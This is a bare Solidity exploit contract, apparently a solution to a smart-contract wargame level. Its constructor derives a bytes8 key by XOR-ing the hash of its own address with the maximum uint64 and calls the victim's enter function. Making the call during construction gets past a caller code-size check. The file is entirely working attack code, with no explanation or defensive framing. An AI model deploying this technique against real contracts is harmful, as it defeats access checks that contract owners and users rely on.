// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.12;

contract Attack {
    constructor(address _victim) {
        bytes8 _key = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
                (uint64(0) - 1)
        );
        _victim.call(abi.encodeWithSignature("enter(bytes8)", _key));
    }
}
